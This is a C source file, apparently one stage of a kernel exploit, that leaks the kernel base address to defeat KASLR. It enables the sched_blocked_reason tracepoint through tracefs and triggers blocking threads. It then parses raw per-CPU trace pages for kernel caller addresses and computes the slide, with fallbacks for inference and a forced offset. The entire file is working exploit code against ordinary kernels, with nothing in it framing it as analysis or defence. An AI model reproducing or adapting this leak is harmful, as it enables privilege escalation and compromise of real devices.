#include "common.h"

#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
#ifndef SLIDE_TRACEFS_EVENT_ID
#define SLIDE_TRACEFS_EVENT_ID 109
#endif
#ifndef SLIDE_TRACEFS_MAX_RETRY
#define SLIDE_TRACEFS_MAX_RETRY 6
#endif
#define SLIDE_BLOCK_THREADS 16
#define SLIDE_MAX_DIAG_CALLERS 32

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

static int slide_tracefs_read_int(const char *path) {
  char buf[32];
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return -1;
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0)
    return -1;
  buf[n] = '\0';
  return atoi(buf);
}

static int slide_tracefs_read_caller_offset(void) {
  static const char path[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/format";
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return 16;
  char buf[2048];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0)
    return 16;
  buf[n] = '\0';
  char *p = strstr(buf, "\tcaller");
  if (!p)
    p = strstr(buf, " caller");
  if (!p)
    return 16;
  char *off = strstr(p, "offset:");
  if (!off || off - p > 120)
    return 16;
  int val = atoi(off + 7);
  return (val >= 8 && val <= 64) ? val : 16;
}

struct slide_block_ctx {
  int pipe_rd;
  atomic_int *started;
};

static void *slide_block_fn(void *arg) {
  struct slide_block_ctx *ctx = arg;
  char c;
  atomic_fetch_add(ctx->started, 1);
  (void)read(ctx->pipe_rd, &c, 1);
  return NULL;
}

static void slide_generate_block_events(void) {
  int pipes[SLIDE_BLOCK_THREADS][2];
  pthread_t tids[SLIDE_BLOCK_THREADS];
  struct slide_block_ctx ctxs[SLIDE_BLOCK_THREADS];
  atomic_int started = 0;
  int spawned = 0;

  for (int i = 0; i < SLIDE_BLOCK_THREADS; i++) {
    if (pipe(pipes[i]) < 0)
      continue;
    ctxs[i].pipe_rd = pipes[i][0];
    ctxs[i].started = &started;
    if (pthread_create(&tids[i], NULL, slide_block_fn, &ctxs[i]) != 0) {
      close(pipes[i][0]);
      close(pipes[i][1]);
      continue;
    }
    spawned++;
  }

  int wait_ms = 0;
  while (atomic_load(&started) < spawned && wait_ms < 500) {
    usleep(1000);
    wait_ms++;
  }
  usleep(20000);

  for (int i = 0; i < spawned; i++) {
    (void)write(pipes[i][1], "x", 1);
  }

  for (int i = 0; i < spawned; i++) {
    pthread_join(tids[i], NULL);
    close(pipes[i][0]);
    close(pipes[i][1]);
  }
}

struct slide_diag {
  uint64_t callers[SLIDE_MAX_DIAG_CALLERS];
  int caller_count;
  int events_total;
  int events_matched_id;
};

static int slide_tracefs_parse_page(
    const unsigned char *page, size_t page_len,
    uint16_t target_event_id, int caller_offset,
    uintptr_t *candidate_out, struct slide_diag *diag) {
  if (page_len < 20)
    return 0;

  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len)
    end = page_len;

  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29)
      break;

    size_t record_len = (size_t)type_len * 4;
    size_t record = pos + 4;
    if (record + record_len > end)
      break;

    diag->events_total++;

    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));

    if (event_id == target_event_id) {
      diag->events_matched_id++;

      if ((int)record_len >= caller_offset + 8) {
        uint64_t caller = 0;
        memcpy(&caller, page + record + caller_offset, sizeof(caller));

        if (diag->caller_count < SLIDE_MAX_DIAG_CALLERS) {
          int dup = 0;
          for (int d = 0; d < diag->caller_count; d++) {
            if (diag->callers[d] == caller) {
              dup = 1;
              break;
            }
          }
          if (!dup)
            diag->callers[diag->caller_count++] = caller;
        }

        uint64_t link_caller =
            KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
        if (caller >= link_caller) {
          uint64_t candidate = caller - link_caller;
          if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
            pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                       (unsigned long long)caller,
                       (unsigned long long)candidate);
            *candidate_out = (uintptr_t)candidate;
            return 1;
          }
        }
      }
    }
    pos = record + record_len;
  }
  return 0;
}

static int slide_try_infer_from_callers(
    struct slide_diag *diag, uintptr_t *candidate_out) {
  if (diag->caller_count < 2)
    return 0;
  static const uint64_t candidates[] = {SLIDE_P0_OFFSET_CANDIDATES};
  int ncand = (int)(sizeof(candidates) / sizeof(candidates[0]));

  for (int s = 0; s < ncand; s++) {
    uint64_t slide = candidates[s];
    int valid = 0;
    for (int c = 0; c < diag->caller_count; c++) {
      uint64_t raw = diag->callers[c];
      if (raw < KIMAGE_TEXT_BASE + slide)
        goto next_slide;
      uint64_t off = raw - KIMAGE_TEXT_BASE - slide;
      if (off > 0x3000000ULL)
        goto next_slide;
      valid++;
    }
    if (valid == diag->caller_count) {
      int unique_slide = 1;
      for (int s2 = 0; s2 < ncand && unique_slide; s2++) {
        if (s2 == s)
          continue;
        uint64_t slide2 = candidates[s2];
        int ok2 = 1;
        for (int c = 0; c < diag->caller_count && ok2; c++) {
          uint64_t raw = diag->callers[c];
          if (raw < KIMAGE_TEXT_BASE + slide2) {
            ok2 = 0;
          } else {
            uint64_t off = raw - KIMAGE_TEXT_BASE - slide2;
            if (off > 0x3000000ULL)
              ok2 = 0;
          }
        }
        if (ok2)
          unique_slide = 0;
      }
      if (!unique_slide)
        continue;
      pr_success("slide tracefs inferred slide=%08llx from %d callers\n",
                 (unsigned long long)slide, diag->caller_count);
      *candidate_out = (uintptr_t)slide;
      return 1;
    }
  next_slide:;
  }
  return 0;
}

static int slide_tracefs_leak_kernel_base(void) {
  static const char tracing_on[] = SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char trace[] = SLIDE_TRACEFS_ROOT "/trace";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
  static const char event_id_path[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/id";

  int dyn_id = slide_tracefs_read_int(event_id_path);
  uint16_t event_id =
      (dyn_id > 0) ? (uint16_t)dyn_id : (uint16_t)SLIDE_TRACEFS_EVENT_ID;
  int caller_offset = slide_tracefs_read_caller_offset();

  pr_info("slide tracefs event_id=%u (sysfs=%d compiled=%d) "
          "caller_offset=%d\n",
          (unsigned)event_id, dyn_id, SLIDE_TRACEFS_EVENT_ID, caller_offset);

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  struct slide_diag cumulative = {.caller_count = 0,
                                  .events_total = 0,
                                  .events_matched_id = 0};

  for (int attempt = 0; attempt < SLIDE_TRACEFS_MAX_RETRY; attempt++) {
    if (!slide_tracefs_write(tracing_on, "0") ||
        !slide_tracefs_write(event_enable, "1") ||
        !slide_tracefs_write(tracing_on, "1")) {
      pr_error("slide tracefs setup failed attempt=%d errno=%d\n",
               attempt, errno);
      return 0;
    }

    int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
    if (trace_fd >= 0)
      close(trace_fd);

    slide_generate_block_events();

    int sleep_ms = 200 + attempt * 300;
    usleep(sleep_ms * 1000);

    slide_tracefs_write(tracing_on, "0");

    struct slide_diag round = {.caller_count = 0,
                               .events_total = 0,
                               .events_matched_id = 0};
    uintptr_t candidate = 0;
    int found = 0;

    for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
      char path[128];
      snprintf(path, sizeof(path),
               SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
      int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
      if (fd < 0)
        continue;
      unsigned char page[4096];
      ssize_t got;
      while ((got = read(fd, page, sizeof(page))) > 0) {
        if (slide_tracefs_parse_page(page, (size_t)got, event_id,
                                     caller_offset, &candidate, &round)) {
          found = 1;
          break;
        }
      }
      close(fd);
    }

    cumulative.events_total += round.events_total;
    cumulative.events_matched_id += round.events_matched_id;
    for (int i = 0; i < round.caller_count; i++) {
      int dup = 0;
      for (int j = 0; j < cumulative.caller_count; j++) {
        if (cumulative.callers[j] == round.callers[i]) {
          dup = 1;
          break;
        }
      }
      if (!dup && cumulative.caller_count < SLIDE_MAX_DIAG_CALLERS)
        cumulative.callers[cumulative.caller_count++] = round.callers[i];
    }

    pr_info("slide tracefs attempt=%d/%d events=%d matched_id=%d "
            "callers=%d found=%d\n",
            attempt + 1, SLIDE_TRACEFS_MAX_RETRY,
            round.events_total, round.events_matched_id,
            round.caller_count, found);

    if (found) {
      slide_tracefs_write(event_enable, "0");
      slide_p0_offset = candidate;
      kaslr_base = KIMAGE_TEXT_BASE + candidate;
      kaslr_slide = candidate;
      kaslr_done = 1;
      pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
                 "slide=%016llx p0_offset=%08zx\n",
                 getpid(), (unsigned long long)kaslr_base,
                 (unsigned long long)kaslr_slide, slide_p0_offset);
      return 1;
    }
  }

  slide_tracefs_write(event_enable, "0");

  pr_warning("slide tracefs primary match failed, total_events=%d "
             "matched_id=%d unique_callers=%d\n",
             cumulative.events_total, cumulative.events_matched_id,
             cumulative.caller_count);

  for (int i = 0; i < cumulative.caller_count; i++) {
    uint64_t c = cumulative.callers[i];
    uint64_t raw = (c >= KIMAGE_TEXT_BASE) ? c - KIMAGE_TEXT_BASE : 0;
    pr_info("slide tracefs caller[%d]=%016llx raw_off=%08llx\n",
            i, (unsigned long long)c, (unsigned long long)raw);
  }

  if (cumulative.events_matched_id > 0 && cumulative.caller_count >= 2) {
    uintptr_t inferred = 0;
    if (slide_try_infer_from_callers(&cumulative, &inferred)) {
      slide_p0_offset = inferred;
      kaslr_base = KIMAGE_TEXT_BASE + inferred;
      kaslr_slide = inferred;
      kaslr_done = 1;
      pr_success("slide-kaslr-ok source=tracefs-infer pid=%d base=%016llx "
                 "slide=%016llx p0_offset=%08zx\n",
                 getpid(), (unsigned long long)kaslr_base,
                 (unsigned long long)kaslr_slide, slide_p0_offset);
      return 1;
    }
  }

  if (cumulative.events_matched_id > 0 && cumulative.caller_count > 0) {
    uint64_t first = cumulative.callers[0];
    if (first >= KIMAGE_TEXT_BASE) {
      uint64_t raw = first - KIMAGE_TEXT_BASE;
      uint64_t page_base = raw & ~0xffffULL;
      if (page_base <= 0x1f0000ULL + 0x3000000ULL) {
        pr_warning("slide tracefs hint: try SLIDE_P0_OFFSET=0x%06llx "
                   "(or nearby 64K-aligned values)\n",
                   (unsigned long long)(page_base % 0x200000ULL));
      }
    }
  }

  pr_error("slide tracefs worker caller not found\n");
  return 0;
}

int slide_leak_kernel_base(void) {
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    slide_p0_offset = (uintptr_t)value;
    kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
    kaslr_slide = slide_p0_offset;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok source=forced pid=%d base=%016llx "
               "slide=%016llx p0_offset=%08zx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide, slide_p0_offset);
    return 1;
  }
  return slide_tracefs_leak_kernel_base();
}
